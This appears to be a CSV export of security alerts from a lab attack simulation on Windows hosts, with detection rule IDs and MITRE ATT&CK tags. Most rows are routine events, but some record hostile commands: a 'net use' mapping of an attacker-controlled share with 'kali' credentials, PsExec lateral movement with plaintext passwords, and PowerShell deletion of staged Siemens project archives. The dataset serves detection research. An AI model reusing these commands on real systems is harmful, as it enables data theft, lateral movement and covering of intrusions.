4733,Attack Step 4,"May 9, 2025 @ 16:26:47.635",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4734,Attack Step 4,"May 9, 2025 @ 16:26:53.947",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4735,Attack Step 4,"May 9, 2025 @ 16:26:56.375",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4736,Attack Step 4,"May 9, 2025 @ 16:26:56.526",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4737,Attack Step 4,"May 9, 2025 @ 16:26:59.452",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4738,Attack Step 4,"May 9, 2025 @ 16:26:59.467",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wsappx -p,,3,67027,A process was created.,,,
4739,Attack Step 4,"May 9, 2025 @ 16:27:00.228",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4740,Attack Step 4,"May 9, 2025 @ 16:27:05.585",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4741,Attack Step 4,"May 9, 2025 @ 16:27:05.710",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wsappx -p,,3,67027,A process was created.,,,
4742,Attack Step 4,"May 9, 2025 @ 16:27:31.102",15,10.12.25.3,Windows11,Application,16384,4676,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4743,Attack Step 4,"May 9, 2025 @ 16:27:32.870",16,10.12.25.5,Windows11EWS,Application,16384,2228,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4744,Attack Step 4,"May 9, 2025 @ 16:27:46.600",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4745,Attack Step 4,"May 9, 2025 @ 16:27:46.610",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4746,Attack Step 4,"May 9, 2025 @ 16:28:46.585",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler",,3,67027,A process was created.,,,
4747,Attack Step 4,"May 9, 2025 @ 16:28:47.122",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4748,Attack Step 4,"May 9, 2025 @ 16:28:47.135",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4749,Attack Step 4,"May 9, 2025 @ 16:29:47.541",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4750,Attack Step 4,"May 9, 2025 @ 16:29:47.541",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4751,Attack Step 4,"May 9, 2025 @ 16:30:26.137",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe5_ Global\\UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4752,Attack Step 4,"May 9, 2025 @ 16:30:26.212",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4753,Attack Step 4,"May 9, 2025 @ 16:30:26.350",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4754,Attack Step 4,"May 9, 2025 @ 16:30:27.219",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4755,Attack Step 4,"May 9, 2025 @ 16:30:28.114",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4756,Attack Step 4,"May 9, 2025 @ 16:30:28.244",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4757,Attack Step 4,"May 9, 2025 @ 16:30:28.250",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4758,Attack Step 4,"May 9, 2025 @ 16:30:54.148",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4759,Attack Step 4,"May 9, 2025 @ 16:30:54.195",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4760,Attack Step 4,"May 9, 2025 @ 16:31:02.629",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\dmclient.exe\"" utcwnf",,3,67027,A process was created.,,,
4761,Attack Step 4,"May 9, 2025 @ 16:31:02.678",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4762,Attack Step 4,"May 9, 2025 @ 16:31:08.970",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4763,Attack Step 4,"May 9, 2025 @ 16:31:09.104",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4764,Attack Step 4,"May 9, 2025 @ 16:31:09.196",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.28.2,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4765,Attack Step 4,"May 9, 2025 @ 16:31:09.274",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.28.2,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4766,Attack Step 4,"May 9, 2025 @ 16:31:09.275",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4767,Attack Step 4,"May 9, 2025 @ 16:31:09.338",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.28.2,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4768,Attack Step 4,"May 9, 2025 @ 16:31:10.652",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4769,Attack Step 4,"May 9, 2025 @ 16:31:10.706",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4770,Attack Step 4,"May 9, 2025 @ 16:31:12.064",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4771,Attack Step 4,"May 9, 2025 @ 16:31:12.073",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4772,Attack Step 4,"May 9, 2025 @ 16:31:12.155",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4773,Attack Step 4,"May 9, 2025 @ 16:31:12.293",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.28.2,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4774,Attack Step 4,"May 9, 2025 @ 16:31:12.427",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4775,Attack Step 4,"May 9, 2025 @ 16:31:12.432",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4776,Attack Step 4,"May 9, 2025 @ 16:31:12.818",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4777,Attack Step 4,"May 9, 2025 @ 16:31:12.820",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4778,Attack Step 4,"May 9, 2025 @ 16:31:12.832",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4779,Attack Step 4,"May 9, 2025 @ 16:31:12.839",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,172.19.38.141,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4780,Attack Step 4,"May 9, 2025 @ 16:31:12.951",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4781,Attack Step 4,"May 9, 2025 @ 16:31:12.986",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,172.19.38.141,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4782,Attack Step 4,"May 9, 2025 @ 16:31:13.168",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,172.19.38.141,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4783,Attack Step 4,"May 9, 2025 @ 16:31:13.168",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4784,Attack Step 4,"May 9, 2025 @ 16:31:13.649",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4785,Attack Step 4,"May 9, 2025 @ 16:31:13.772",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,172.19.38.141,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4786,Attack Step 4,"May 9, 2025 @ 16:31:41.381",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4787,Attack Step 4,"May 9, 2025 @ 16:31:41.384",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4788,Attack Step 4,"May 9, 2025 @ 16:31:41.419",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe6_ Global\\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4789,Attack Step 4,"May 9, 2025 @ 16:31:48.938",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4790,Attack Step 4,"May 9, 2025 @ 16:31:48.998",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4791,Attack Step 4,"May 9, 2025 @ 16:31:49.114",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4792,Attack Step 4,"May 9, 2025 @ 16:32:33.926",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4793,Attack Step 4,"May 9, 2025 @ 16:32:33.940",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4794,Attack Step 4,"May 9, 2025 @ 16:32:33.941",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,C:\\WINDOWS\\system32\\wsmprovhost.exe -Embedding,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /user:kali kali",,3,92037,A net.exe connection to a remote resource was started by C:\\Windows\\System32\\wsmprovhost.exe,[T1567],[Exfiltration],[Exfiltration Over Web Service]
4795,Attack Step 4,"May 9, 2025 @ 16:32:33.954",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /user:kali kali",,3,67027,A process was created.,,,
4796,Attack Step 4,"May 9, 2025 @ 16:32:33.970",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4797,Attack Step 4,"May 9, 2025 @ 16:32:50.212",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4798,Attack Step 4,"May 9, 2025 @ 16:32:50.225",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4799,Attack Step 4,"May 9, 2025 @ 16:33:21.510",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4800,Attack Step 4,"May 9, 2025 @ 16:33:21.512",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4801,Attack Step 4,"May 9, 2025 @ 16:33:51.939",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4802,Attack Step 4,"May 9, 2025 @ 16:33:51.949",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4803,Attack Step 4,"May 9, 2025 @ 16:34:31.906",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4804,Attack Step 4,"May 9, 2025 @ 16:34:31.967",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4805,Attack Step 4,"May 9, 2025 @ 16:34:31.972",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS powershell.exe -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4806,Attack Step 4,"May 9, 2025 @ 16:34:32.093",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4807,Attack Step 4,"May 9, 2025 @ 16:34:32.160",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4808,Attack Step 4,"May 9, 2025 @ 16:34:32.160",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4809,Attack Step 4,"May 9, 2025 @ 16:34:32.160",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4810,Attack Step 4,"May 9, 2025 @ 16:34:32.362",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4811,Attack Step 4,"May 9, 2025 @ 16:34:32.433",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4812,Attack Step 4,"May 9, 2025 @ 16:34:33.651",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4813,Attack Step 4,"May 9, 2025 @ 16:34:33.670",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4814,Attack Step 4,"May 9, 2025 @ 16:34:33.675",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4815,Attack Step 4,"May 9, 2025 @ 16:34:34.001",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4816,Attack Step 4,"May 9, 2025 @ 16:34:34.283",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,92021,Powershell was used to delete files or directories,[T1070.004],[Defense Evasion],[File Deletion]
4817,Attack Step 4,"May 9, 2025 @ 16:34:34.778",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4818,Attack Step 4,"May 9, 2025 @ 16:34:36.517",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4819,Attack Step 4,"May 9, 2025 @ 16:34:37.628",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe6_ Global\\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4820,Attack Step 4,"May 9, 2025 @ 16:34:42.139",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4821,Attack Step 4,"May 9, 2025 @ 16:35:03.865",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4822,Attack Step 4,"May 9, 2025 @ 16:35:03.974",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
